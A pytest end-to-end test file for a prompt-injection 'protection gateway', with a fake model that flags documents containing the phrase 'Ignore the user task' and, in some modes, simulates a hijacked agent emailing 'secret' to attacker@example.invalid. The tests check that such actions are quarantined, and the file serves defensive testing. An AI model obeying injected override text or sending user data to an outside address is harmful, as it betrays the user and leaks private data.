"""Real HTTP, SQLite, evidence storage, sandboxed C workers and SLIM.

Only inference is deterministic. This is distinct from the opt-in live Kimi
smoke test and the separately configured native-account release gates.
"""
import importlib.util
import base64
import json
import os
import shutil
import socket
import threading
import time
import urllib.request
from pathlib import Path

import pytest
import uvicorn

from protection_gateway.bootstrap import build_gateway
from protection_gateway.runtime.config import REPO_ROOT, RuntimeConfig
from protection_gateway.runtime.model_broker import ModelConfig
from protection_gateway.runtime.runtime import Runtime

spec = importlib.util.spec_from_file_location('gateway_smoke', REPO_ROOT / 'scripts/smoke_test.py')
smoke = importlib.util.module_from_spec(spec)
spec.loader.exec_module(smoke)


class DeterministicInference:
    def __init__(self):
        self.calls = []
        self.mode = 'normal'

    def generate(self, config, *, system, user, max_output_tokens, timeout):
        request = json.loads(user)
        documents = request['documents']
        role = 'behavior' if request['tools'] else ('instruction' if 'instruction overrides' in system else 'data')
        self.calls.append(role)
        checked = [{k: v[k] for k in ('resource_id', 'view_id', 'view_hash')} for v in documents]
        result = {'checked_views': checked, 'findings': []}
        if role == 'behavior' and self.mode in {'forbidden_tool', 'unknown_tool'} and not request['history']:
            result = {'tool_calls': [{'operation': 'send_email', 'arguments': {'to': 'attacker@example.invalid', 'subject': 'secret', 'body': 'dummy data'}}]} if self.mode == 'forbidden_tool' else {
                'tool_calls': [{'operation': 'not-a-tool!', 'arguments': {}}]}
        else:
            attack = next((v for v in documents if 'Ignore the user task' in v['text']), None)
            if attack and role in {'instruction', 'data'}:
                result['findings'] = [{'category': 'OVERRIDE_ATTEMPT' if role == 'instruction' else 'DISCLOSURE_REQUEST',
                                       'source_references': [{k: attack[k] for k in checked[0]} | {'span': [0, len(attack['text'])]}]}]
            if role == 'behavior':
                policy = request['task_policy']['policy_id']
                if policy == 'extract_invoice':
                    values = {'invoice_id': 'INV-100', 'amount': '25.00', 'currency': 'USD', 'due_date': '2026-12-01'}
                    output = {}
                    for name, value in values.items():
                        view = next(v for v in documents if value in v['text'])
                        start = view['text'].index(value)
                        output[name] = {'value': value, 'source_references': [{k: view[k] for k in checked[0]} | {'span': [start, start + len(value)]}]}
                    if self.mode == 'invalid_span':
                        output['amount']['source_references'][0]['span'] = [0, 2]
                    result['task_output'] = output
                else:
                    view = next(v for v in documents if v['text'])
                    result['task_output'] = {'statements': [{'text': view['text'], 'source_references': [{k: view[k] for k in checked[0]} | {'span': [0, len(view['text'])]}]}]}
            if self.mode == 'missing_coverage':
                result['checked_views'] = []
        return {'stop_reason': 'end_turn', 'text': json.dumps(result), 'usage': {'input_tokens': 100, 'output_tokens': 100}}


@pytest.fixture
def running_gateway():
    with socket.socket() as socket_:
        socket_.bind(('127.0.0.1', 0))
        port = socket_.getsockname()[1]
    state = REPO_ROOT / 'var' / 'gateway-e2e' / f'{os.getpid()}-{port}'
    config = RuntimeConfig(state_dir=state, dev_mode=True, port=port, model=ModelConfig(provider='kimi', model='kimi-k3'))
    inference = DeterministicInference()
    runtime = Runtime(config, model_transport=inference)
    gateway = build_gateway(config, runtime=runtime)
    server = None
    thread = None
    try:
        if not gateway.capabilities()['isolation']['available']:
            if os.environ.get('PG_REQUIRE_ISOLATION') == '1':
                pytest.fail('Host sandbox verification is required')
            pytest.skip('Verified host sandbox required; this is not an end-to-end pass')
        assert gateway.capabilities()['complete_workflow']['available'], gateway.capabilities()
        server = uvicorn.Server(uvicorn.Config(gateway, host='127.0.0.1', port=port, log_level='error', access_log=False))
        thread = threading.Thread(target=server.run, daemon=True)
        thread.start()
        deadline = time.monotonic() + 10
        while not server.started and thread.is_alive() and time.monotonic() < deadline:
            time.sleep(.02)
        assert server.started
        client = smoke.Client(f'http://127.0.0.1:{port}', config.login_token_file.read_text().strip())
        yield client, inference, gateway
    finally:
        if server:
            server.should_exit = True
        if thread:
            thread.join(15)
            assert not thread.is_alive()
        gateway.close()
        shutil.rmtree(state, ignore_errors=True)


@pytest.mark.isolation
def test_complete_http_workflow(running_gateway):
    client, inference, gateway = running_gateway
    observations = smoke.run(client)
    assert len(observations) == 5
    assert {'instruction', 'data', 'behavior'} <= set(inference.calls)
    assert gateway.runtime.slim is not None


@pytest.mark.isolation
@pytest.mark.parametrize('mode', ['invalid_span', 'missing_coverage'])
def test_incomplete_model_evidence_never_releases(running_gateway, mode):
    client, inference, _ = running_gateway
    inference.mode = mode
    _, scan = client.start([client.upload(smoke.INVOICE)])
    status = client.wait(scan, 30)
    assert status['decision'] == 'REVIEW' and not status['review']['eligible'], status
    client.request(f'/v1/scans/{scan}/result', expected=428)


@pytest.mark.isolation
@pytest.mark.parametrize('mode', ['forbidden_tool', 'unknown_tool'])
def test_collector_event_quarantines_even_without_final_worker_result(running_gateway, mode):
    client, inference, gateway = running_gateway
    inference.mode = mode
    _, scan = client.start([client.upload(smoke.INVOICE)])
    status = client.wait(scan, 30)
    assert status['decision'] == 'QUARANTINE', status
    assert 'VERIFIED_FORBIDDEN_ACTION' in status['reason_codes']
    assert status['collector_evidence']
    assert gateway.core.service.db.query_one('SELECT 1 FROM collector_events WHERE scan_id = ?', (scan,))
    client.request(f'/v1/scans/{scan}/result', expected=403)


@pytest.mark.isolation
def test_decoded_views_and_original_provenance_survive_real_extraction(running_gateway):
    client, _, gateway = running_gateway
    raw = b'base64:' + base64.b64encode(smoke.INVOICE)
    _, scan = client.start([client.upload(raw)])
    status = client.wait(scan, 30)
    assert status['decision'] == 'ALLOW_UNDER_POLICY', status
    extraction = gateway.core.service.db.query_one('SELECT * FROM extractions WHERE scan_id = ?', (scan,))
    views = json.loads(extraction['views_json'])
    assert len(views) >= 2
    tenant = gateway.core.service._scan(scan)['tenant_id']
    for view in views:
        source_map = json.loads(gateway.core.service.store.get(view['source_map_ref'], tenant))
        assert all(0 <= segment[2] < segment[3] <= len(raw) for segment in source_map)


@pytest.mark.isolation
def test_origin_and_csrf_enforced_on_actual_http(running_gateway):
    client, _, _ = running_gateway
    client.request('/v1/resources', {'media_type': 'text/plain', 'content_base64': 'aGVsbG8='},
                   headers={'Origin': 'http://attacker.invalid'}, expected=403)
    client.csrf = 'invalid'
    client.request('/v1/resources', {'media_type': 'text/plain', 'content_base64': 'aGVsbG8='}, expected=403)


@pytest.mark.isolation
def test_real_mcp_only_exposes_scoped_read_workflow(running_gateway):
    client, _, gateway = running_gateway
    token = gateway.runtime.config.login_token_file.read_text().strip()
    def rpc(method, params=None):
        request = urllib.request.Request(client.url + '/mcp', data=json.dumps({
            'jsonrpc': '2.0', 'id': 1, 'method': method, 'params': params or {}}).encode(), headers={
                'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json',
                'Accept': 'application/json, text/event-stream'})
        with urllib.request.urlopen(request, timeout=30) as response:
            assert response.status == 200
            return json.load(response)
    tools = rpc('tools/list')['result']['tools']
    assert {t['name'] for t in tools} == {'inspect_resource', 'get_scan_status', 'get_inspected_result'}
    resource = client.upload(smoke.INVOICE)
    task = client.request('/v1/task-sessions', {'policy_id': 'extract_invoice', 'resource_ids': [resource]}, expected=201)['task_session_id']
    args = {'resource_id': resource, 'task_session_id': task}
    envelope = rpc('tools/call', {'name': 'inspect_resource', 'arguments': args})['result']['structuredContent']
    scan = envelope['data']['scan_id']
    assert client.wait(scan, 30)['decision'] == 'ALLOW_UNDER_POLICY'
    progress = rpc('tools/call', {'name': 'get_scan_status', 'arguments': {'scan_id': scan}})['result']['structuredContent']['data']
    assert 'findings' not in progress and 'text' not in progress
    released = rpc('tools/call', {'name': 'get_inspected_result', 'arguments': {'scan_id': scan}})['result']['structuredContent']['data']
    assert released['result']['output']['fields']['amount']['value'] == '25.00'
    denied = rpc('tools/call', {'name': 'execute_simulated_action', 'arguments': {}})
    assert denied['error']['code'] == -32602
